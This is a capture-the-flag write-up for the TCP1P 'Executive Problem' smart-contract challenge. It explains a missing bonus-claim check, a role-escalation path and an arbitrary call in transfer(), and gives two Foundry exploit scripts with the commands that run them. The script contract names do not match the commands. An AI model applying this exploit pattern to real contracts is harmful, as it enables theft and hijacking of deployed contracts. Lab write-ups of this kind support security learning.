# Writeup for Executive Problem

- Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry.

### Challenge Description

If only we managed to climb high enough, maybe we can dethrone someone?

### Exploit

Click [here](./src/contracts/) to view the source contracts.

In this challenge our task is make `isSolved()` function return true.

```
function isSolved() public view returns(bool){
    return crain.crain() != address(this);
}
```

The `isSolved()` function returns `true` if the `crain()` function in the `Crain` contract returns an address that is different from the `Setup` contract address.

Now lets look into Crain contract.

```solidity
constructor(address payable _ce) {
    ce = CrainExecutive(_ce);
    crain = msg.sender;
}
```

In the `Crain` contract, `crain` is a public variable that is set to `msg.sender` in the constructor. Since the `Setup` contract deploys the `Crain` contract, `crain` is initially set to the `Setup` contract address.

```
function ascendToCrain(address _successor) public _onlyExecutives{
    crain = _successor;
}
```

The only way we can change the crain address is by calling the ascendToCrain() by passing the new crain address. But it has a modifier \_onlyExecutives. So in order to call this function we need to pass \_onlyExecutives modifier.

```
modifier _onlyExecutives(){
    require(msg.sender == address(ce), "Only Executives can replace");
    _;
}
```

The `_onlyExecutives()` modifier ensures that `msg.sender` (the caller) is the address of `ce` (Crain Executive). The address of `ce` is set in the constructor. The `Setup` contract first deploys the Crain Executive contract and passes the address of Crain Executive as an argument to the constructor of the Crain contract.

The address of `ce` is set in the constructor and is not changed anywhere. Since we cannot change the `ce` address, we won't be able to directly call the `ascendToCrain()` function. The only way to call `ascendToCrain()` is by making the Crain Executive contract call it. Therefore, we need to check if there is any place where the Crain Executive contract directly calls `ascendToCrain()` or makes any low-level calls.

Now let's look into CrainExecutive contract.

```solidity
function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
    require(to != address(0), "Invalid Recipient");
    require(balanceOf[msg.sender] - _amount >= 0, "Not enough Credit");
    uint256 totalSent = _amount;
    balanceOf[msg.sender] -= totalSent;
    balanceOf[to] += totalSent;
    (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
    require(transfered, "Failed to Transfer Credit!");
}
```

The `transfer()` function takes three arguments: an address `to`, a `uint256` `_amount`, and a `bytes` `_message`. It first executes the `_onlyExecutive()` modifier. If the modifier passes, it performs some balance checks. Then, it makes a low-level call to the address `to` with the data `_message` and the value `_amount`.

If we can call the `transfer()` function and pass the address of the `Crain` contract as `to` and the function selector of `ascendToCrain()` as `_message`, then the `crain` address will be changed. However, to call `transfer()`, we need to become the executive.

```solidity
function becomeExecutive() public {
    require(isEmployee[msg.sender] == true && isManager[msg.sender] == true);
    require(balanceOf[msg.sender] >= 5 ether, "Must be that Rich to become an Executive");
    isExecutive[msg.sender] = true;
    }
```

To become an executive, we need to call `becomeExecutive()`. We will only become an executive if we are both an employee and a manager, and our balance in the contract is at least 5 ether.

Now let's look into how to become employee and manager.

```solidity
function becomeEmployee() public {
    isEmployee[msg.sender] = true;
}
```

By calling the `becomeEmployee()` function, we will become an employee.

```solidity
function becomeManager() public _onlyEmployee{
    require(balanceOf[msg.sender] >= 1 ether, "Must have at least 1 ether");
    require(isEmployee[msg.sender] == true, "Only Employee can be promoted");
    isManager[msg.sender] = true;
}
```

To become a manager, we need to call `becomeManager()`. We will only become a manager if we are an employee and our balance in the contract is at least `1 ether`.

Therefore, to become an executive, we need to become both a manager and an employee. To become a manager, we need `1 ether`, and to become an executive, we need `5 ether`. In total, we need `6 ether`.

Now we need to make our balance 6 ether. When I looked into the code, I found two ways to get 6 ether.

```solidity
function claimStartingBonus() public _onlyOnePerEmployee{
    balanceOf[owner] -= 1e18;
    balanceOf[msg.sender] += 1e18;
}
```

The first way is by calling `claimStartingBonus()`. When we call `claimStartingBonus()`, it will execute the `_onlyOnePerEmployee()` modifier. The modifier has a check: `require(hasTakeBonus[msg.sender] == false, "Bonus can only be taken once!");`, but since `hasTakeBonus[msg.sender]` is not updated in the `claimStartingBonus()` function, we will be able to call the function 25 times, as the owner has only 25 ether. However, we actually need only 6 ether to become an executive.

```solidity
function buyCredit() public payable _onlyEmployee{
    require(msg.value >= 1 ether, "Minimum is 1 Ether");
    uint256 totalBought = msg.value;
    balanceOf[msg.sender] += totalBought;
    totalSupply += totalBought;
}
```

The second way is by calling `buyCredit()` function after becoming an employee. In the instance, they have given 7 ether as our wallet balance. So we can directly send 6 ether while calling the `buyCredit()` function, and it will set our balance to 6 ether.

Let's recall all the steps involved to exploit:

Below are the Exploit scripts:

### Script 1: Using `claimStartingBonus()`

1. Get a balance of at least 6 ether by calling `claimStartingBonus()` multiple times.
2. Become an employee by calling `becomeEmployee()`.
3. Become a manager by calling `becomeManager()`.
4. Become an executive by calling `becomeExecutive()`.
5. Call the `transfer` function by passing the address of the `Crain` contract as `to`, call data to invoke `ascendToCrain()` as `_message`, and value as 0. The value should be zero because `ascendToCrain()` is a non-payable function.
6. Call `isSolved()` and verify.

### Script 2: Using `buyCredit()`

1. Become an employee by calling `becomeEmployee()`.
2. Get a balance of 6 ether by calling `buyCredit()` and sending 6 ether.
3. Become a manager by calling `becomeManager()`.
4. Become an executive by calling `becomeExecutive()`.
5. Call the `transfer` function by passing the address of the `Crain` contract as `to`, call data to invoke `ascendToCrain()` as `_message`, and value as 0. The value should be zero because `ascendToCrain()` is a non-payable function.
6. Call `isSolved()` and verify.

Below are the Exploit scripts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Setup} from "src/contracts/Setup.sol";

contract ExploitExecutive is Script {
    Setup public setup;

    function run() public {
        vm.startBroadcast();
        setup = Setup(0xD3AC2f52E7dCCe686BA20aD048079e094A047CEf);
        for (uint256 i = 0; i < 6; i++) {
            setup.cexe().claimStartingBonus();
        }
        setup.cexe().becomeEmployee();
        setup.cexe().becomeManager();
        setup.cexe().becomeExecutive();
        bytes memory data = abi.encodeWithSignature("ascendToCrain(address)", address(this));
        setup.cexe().transfer(address(setup.crain()), 0, data);
        vm.stopBroadcast();
    }
}

```

```shell
$ forge script script/ExploitExecutive.s.sol:ExploitExecutive1 --rpc-url http://ctf.tcp1p.team:44455/01921e42-61fb-498e-8533-12498c9f96b2 --broadcast -i 1
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Setup} from "src/contracts/Setup.sol";

contract ExploitExecutive is Script {
    Setup public setup;

    function run() public {
        vm.startBroadcast();
        setup = Setup(//YOUR__SETUP__ADDR);
        setup.cexe().becomeEmployee();
        setup.cexe().buyCredit{value: 6 ether}();
        setup.cexe().becomeManager();
        setup.cexe().becomeExecutive();
        bytes memory data = abi.encodeWithSignature("ascendToCrain(address)", address(this));
        setup.cexe().transfer(address(setup.crain()), 0, data);
        vm.stopBroadcast();
    }
}
```

```shell
$ forge script script/ExploitExecutive.s.sol:ExploitExecutive2 --rpc-url http://ctf.tcp1p.team:44455/01921e42-61fb-498e-8533-12498c9f96b2 --broadcast -i 1
```

Any of the above two scripts will work; you can use either one. The only difference between the two scripts is how we get the ether. I hope you This writeup is helpful.

**Flag:** `TCP1P{Imagine_getting_kicked_out_like_that_by_s0m3_3Xecu7iVE}`

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
